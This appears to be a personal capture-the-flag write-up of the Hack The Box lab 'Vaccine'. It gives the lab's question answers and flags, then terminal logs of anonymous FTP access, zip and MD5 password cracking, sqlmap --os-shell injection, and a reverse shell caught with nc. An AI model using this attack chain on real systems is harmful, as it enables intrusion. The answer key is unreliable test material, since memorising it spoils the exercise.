Besides SSH and HTTP, what other service is hosted on this box?
FTP

This service can be configured to allow login with any password for specific username. What is that username?
anonymous

What is the name of the file downloaded over this service?
backup.zip

What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
zip2john

What is the password for the admin user on the website?
qwerty789

What option can be passed to sqlmap to try to get command execution via the sql injection?
--os-shell

What program can the postgres user run as root using sudo?
vi

Submit user flag
ec9b13ca4d6229cd5cc1e09980965bf7

Submit root flag
dd6e058e814260bc70e9bbdef2715849



``` bash 
┌─[✗]─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $sudo nmap -sC -sV 10.129.95.174
[sudo] password for ramdark: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 03:39 CST
Nmap scan report for 10.129.95.174
Host is up (0.082s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.233
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0ee58077534b00b9165b259569527a4 (RSA)
|   256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)
|_  256 425bc321dfefa20bc95e03421d69d028 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
```

``` bash 
┌─[✗]─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $ftp 10.129.95.174
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
Name (10.129.95.174:ramdark): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
2533 bytes received in 0.00 secs (23.4530 MB/s)
ftp> bye
221 Goodbye.
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $ls
backup.zip  document.pdf  Vaccine.md
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
password incorrect--reenter: 
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password
┌─[✗]─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $zip2john backup.zip > hashes
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $john -wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2023-06-03 03:48) 2.439g/s 9990p/s 9990c/s 9990C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $


┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $hashid 2cb42f8734ea607eefed3b70af13bbd3
Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD A9-9420 RADEON R5, 5 COMPUTE CORES 2C+3G, 5295/5359 MB (2048 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Initializing backend runtime for device #1...^Z
[4]+  Stopped                 hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
┌─[✗]─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt --show
2cb42f8734ea607eefed3b70af13bbd3:qwerty789


sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=iligh36ieeijsr06qnch7l69t6" --os-shell






┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Vaccine]
└──╼ $sudo nc -lvnp 443
[sudo] password for ramdark: 
listening on [any] 443 ...
connect to [10.10.14.233] from (UNKNOWN) [10.129.95.174] 48748
bash: cannot set terminal process group (2241): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ ls
ls
base
global
pg_commit_ts
pg_dynshmem
pg_logical
pg_multixact
pg_notify
pg_replslot
pg_serial
pg_snapshots
pg_stat
pg_stat_tmp
pg_subtrans
pg_tblspc
pg_twophase
PG_VERSION
pg_wal
pg_xact
postgresql.auto.conf
postmaster.opts
postmaster.pid
postgres@vaccine:/var/lib/postgresql/11/main$ cd ..
cd ..
postgres@vaccine:/var/lib/postgresql/11$ cd ..
cd ..
postgres@vaccine:/var/lib/postgresql$ ls
ls
11
user.txt
postgres@vaccine:/var/lib/postgresql$ cat user.txt
cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7

```

```PHP
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>MegaCorp Login</title>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">

</head>
  <h1 align=center>MegaCorp Login</h1>
<body>
<!-- partial:index.partial.html -->
<body class="align">

  <div class="grid">

    <form action="" method="POST" class="form login">

      <div class="form__field">
        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
      </div>

      <div class="form__field">
        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
      </div>

      <div class="form__field">
        <input type="submit" value="Sign In">
      </div>

    </form>


  </div>

  <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>

</body>
<!-- partial -->
  
</body>
</html>
```
